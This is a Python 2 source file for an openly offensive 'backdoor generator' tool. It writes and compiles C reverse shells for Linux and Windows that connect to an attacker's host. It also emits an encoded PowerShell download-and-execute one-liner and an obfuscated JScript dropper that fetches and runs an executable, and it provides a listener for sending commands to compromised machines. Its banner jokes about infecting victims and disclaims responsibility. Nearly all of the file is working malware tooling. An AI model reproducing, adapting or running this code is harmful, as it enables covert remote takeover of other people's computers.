#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os 
import sys
import io
import socket



def main():
    reload(sys)
    sys.setdefaultencoding('utf-8')
    print """
_____________________________________________________________ 
|                                                   ^^^^^^^^\ |
|                                                   |       | |
|      *  ZeroDoor Backdoor Generator *             |_ __   | | 
|                                                   (.(. )  | |
|       ~ Created By Souhardya Sardar  ~    _      (_       )  
|            Happy Hacking to all :)        \\      /___/'  /   
|                                           _\\_      \    |   |
|                                          ((   )     /====|  |
|                                           \  <.__._-      \ |
|___________________________________________ <//___.         ||


[---]                 ZeroDoor Backdoor Generator                           [---]
[---]                                                                       [---]
[---]                  Created by Souhardya Sardar                          [---]
[---]                    github.com/Souhardya                               [---]



LEGAL WARNING: While this may be helpful for some, there are significant risks.
You are hereby allowed to cause havoc with this but the owner won't be held 
responsible for any damage you cause :) if you get in trouble I don't care
 

1. BackDoors 
2. Listener


"""

    global option
    option = raw_input('Choose from the following options #~: ')
 
    if option:
        if option == '1':
            backdoor_generator()

        elif option == '2':
            socket_create()
            socket_bind()
            socket_accept()



def backdoor_generator():
    
    print """

                ,----------------,                ,---------, 
            ,--------------------------,        ,"        ," |
          ,"                       ,"  |       ,"        ,"  |
         +------------------------+ |  |     ,"        ,"    |
         |  .--------------------.  |  |     +---------+     |
         |  |                    |  |  |     | -==----'|     |
         |  |$>wget backdoors    |  |  |     |         |     |
         |  | chmod +x backdoors |  |  |/----|`---=    |     |
         |  |  ./backdoors pwn   |  |  |     |==== ooo |      ;
         |  |                    |  |  |     |(((( [33]|    ,"
         |  `--------------------'  |,"      | |((((   |  ,"
         +-----------------------+  ;;       | |       |,"     
            /_)______________(_/  //'       +.---------+
       ___________________________/___  
      /  oooooooooooooooo  .o.  oooo /,   
     / ==ooooooooooooooo==.o.  ooo= //   
    /_==__==========__==_ooo__ooo=_/'   
    `-----------------------------'

                   ~ 3 Immersive Backdoors ~ 


1. Linux Backdoor Generate
2. Windows Generic Backdoor
3. Powershell Liner Backdoor
4. JavaScript Backdoor




"""

    select = input( "Select from the following options ")

    if(select == 1):
        print """


██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗    ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
██║     ██║████╗  ██║██║   ██║╚██╗██╔╝    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝     ██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║██║   ██║██████╔╝
██║     ██║██║╚██╗██║██║   ██║ ██╔██╗     ██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║██║   ██║██╔══██╗
███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗    ██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝


                            ~ Linux Reverse Shell Gen ~
"""

        host = raw_input("[?] Enter your IP (LHOST): " )
        port = raw_input("[?] Enter your port (LPORT): ")
        linux_shell(host, port)
        os.system("gcc .shell.c -o backdoor -pthread && rm -rf .shell.c")
        print "[*] Backdoor Generated now go infect lol ...[*]"

    if(select == 2):
        print """



██╗    ██╗██╗███╗   ██╗    ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
██║    ██║██║████╗  ██║    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
██║ █╗ ██║██║██╔██╗ ██║    ██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║██║   ██║██████╔╝
██║███╗██║██║██║╚██╗██║    ██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║██║   ██║██╔══██╗
╚███╔███╔╝██║██║ ╚████║    ██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                                               
                            ~ Windows Reverse Shell Gen ~
                                
"""        

        host = raw_input( "[?] Enter your IP (LHOST): " )
        port = raw_input("[?] Enter your port (LPORT):" )
        windows_reverse(host, port)
        os.system("/usr/bin/i686-w64-mingw32-gcc winshell.c -o backdoor.exe -lws2_32 && rm -rf winshell.c")
        print "[*] Backdoor Generated now go infect lol ...[*]"
 
    if(select == 3):
        print """

██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██████╗  ██████╗  ██████╗ ██████╗ 
██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║  ██║██║   ██║██║   ██║██████╔╝
██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗██║  ██║██║   ██║██║   ██║██╔══██╗
██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                             
                    ~ Base64 Encoded Powershell Backdoor gen ~
                              (Mostly Undetectable)

"""

        powershell_payload()

    if(select == 4):
        print """

    /$$$$$                               /$$$$$$$                               
   |__  $$                              | $$__  $$                              
      | $$  /$$$$$$  /$$    /$$ /$$$$$$ | $$  \ $$  /$$$$$$   /$$$$$$   /$$$$$$ 
      | $$ |____  $$|  $$  /$$/|____  $$| $$  | $$ /$$__  $$ /$$__  $$ /$$__  $$
 /$$  | $$  /$$$$$$$ \  $$/$$/  /$$$$$$$| $$  | $$| $$  \ $$| $$  \ $$| $$  \__/
| $$  | $$ /$$__  $$  \  $$$/  /$$__  $$| $$  | $$| $$  | $$| $$  | $$| $$      
|  $$$$$$/|  $$$$$$$   \  $/  |  $$$$$$$| $$$$$$$/|  $$$$$$/|  $$$$$$/| $$      
 \______/  \_______/    \_/    \_______/|_______/  \______/  \______/ |__/      
                                                                                
                                                                                
                                                                            
"""
        
        JavaScript_payload()
        print "[+] Save this with .js extension and run on victim system [+]"
        print "[+] Payload generated [+]"

    
    




def linux_shell(host, port):
    print "[*] Starting Process.. [*]"
    with io.FileIO(".shell.c", "w") as file:
        file.write('''

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
 
int main (int argc, char **argv)
{
  int scktd;
  struct sockaddr_in client;
 
  client.sin_family = AF_INET;
  client.sin_addr.s_addr = inet_addr("'''+host+'''");
  client.sin_port = htons('''+port+''');

  scktd = socket(AF_INET,SOCK_STREAM,0);
  connect(scktd,(struct sockaddr *)&client,sizeof(client));

  dup2(scktd,0); // STDIN
  dup2(scktd,1); // STDOUT
  dup2(scktd,2); // STDERR

  execl("/bin/sh","sh","-i",NULL,NULL);

  return 0;
}

''')




#Credits to BlackBox Hacker ( Xabber Lord ) he wrote this a whole back years ago ..... people copied it without giving credits
#Permission taken and thanked too :) 
def windows_reverse(host, port):
    with io.FileIO("winshell.c", "w") as file:
        file.write('''
#include <winsock2.h>
#include <stdio.h>
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib,"ws2_32")
  WSADATA wsaData;
  SOCKET Winsock;
  SOCKET Sock;
  struct sockaddr_in hax;
  char ip_addr[16];
  STARTUPINFO ini_processo;
  PROCESS_INFORMATION processo_info;
//int main(int argc, char *argv[])
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam, int iCmdShow)
{
    FreeConsole();
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
                
    struct hostent *host;
    host = gethostbyname("'''+host+'''");
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi("'''+port+'''"));
    hax.sin_addr.s_addr = inet_addr(ip_addr);
    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);
    memset(&ini_processo,0,sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&ini_processo,&processo_info);
}
''')


                         
def powershell_payload(): # Powershell payload creation

    payload = """

#!/bin/bash


echo "Set LHOST: \c"
read ip

echo "Specify payload name hosted on your web server : \c"
read payload

scriptblock="iex (New-Object Net.WebClient).DownloadString("http://$ip/$payload")"

encode="`echo $scriptblock `"

command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"

echo $command


        """

    os.system(payload)


#shellcoded javascript to evade a little bit obfuscation
def JavaScript_payload():

  payload = """
  
  
  #!/bin/bash


  echo "Payload URL: \c"
  read path

  echo "Custom Process Name : \c" 
  read process

  JS="var myActXobj=this['\x41\x63\x74\x69\x76\x65\x58\x4f\x62\x6a\x65\x63\x74'];var myShell=new myActXobj('\x57\x53\x63\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c');var myHTTP=new myActXobj('\x4d\x53\x58\x4d\x4c\x32\x2e\x58\x4d\x4c\x48\x54\x54\x50');var myTempPath=myShell['\x45\x78\x70\x61\x6e\x64\x45\x6e\x76\x69\x72\x6f\x6e\x6d\x65\x6e\x74\x53\x74\x72\x69\x6e\x67\x73']('\x25\x54\x45\x4d\x50\x25');function dropperFunc(_0x476049,_0x1bbf1b){var _0x4deb99=myTempPath+'\x2f'+_0x1bbf1b+'\x2e\x65\x78\x65';myHTTP['\x6f\x70\x65\x6e']('\x47\x45\x54',_0x476049,![]);myHTTP['\x73\x65\x6e\x64']();if(myHTTP['\x73\x74\x61\x74\x75\x73']==0xc8){var _0x46ad76=new myActXobj('\x41\x44\x4f\x44\x42\x2e\x53\x74\x72\x65\x61\x6d');_0x46ad76['\x6f\x70\x65\x6e']();_0x46ad76['\x74\x79\x70\x65']=0x1;_0x46ad76['\x77\x72\x69\x74\x65'](myHTTP['\x52\x65\x73\x70\x6f\x6e\x73\x65\x42\x6f\x64\x79']);_0x46ad76['\x70\x6f\x73\x69\x74\x69\x6f\x6e']=0x0;_0x46ad76['\x73\x61\x76\x65\x54\x6f\x46\x69\x6c\x65'](_0x4deb99,0x2);_0x46ad76['\x63\x6c\x6f\x73\x65']();myShell['\x52\x75\x6e'](_0x4deb99,0x1,0x0);}}dropperFunc('$path','$process');"

  command="$JS"

  echo $command

  


"""
  os.system(payload)




def socket_create():
    print """

 _______________          |*\_/*|________ 
|  ___________  |        ||_/-\_|______  | 
| |           | |        | |           | | 
| |   0   0   | |        | |   0   0   | | 
| |     -     | |-> -> ->| |     -     | | 
| |   \___/   | |        | |   \___/   | | 
| |___     ___| |        | |___________| | 
|_____|\_/|_____|        |_______________| 
 _|__|/ \|_|_.............._|________|_
/ ********** \            / ********** \ 
 ************ \          / ************ \   
     
~ A Simple Listener To Accept Connections From Compromised Hosts ~


"""

    try:
        global host
        global port
        global s
        host = ''
        port = int(raw_input("Please specify the port :"))
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind socket to port (the host and port the communication will take place) and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()


# Establish connection with client (socket must be listening for them)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = raw_input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024)).encode("utf-8")
            

if __name__ == '__main__':
    main()

   

    

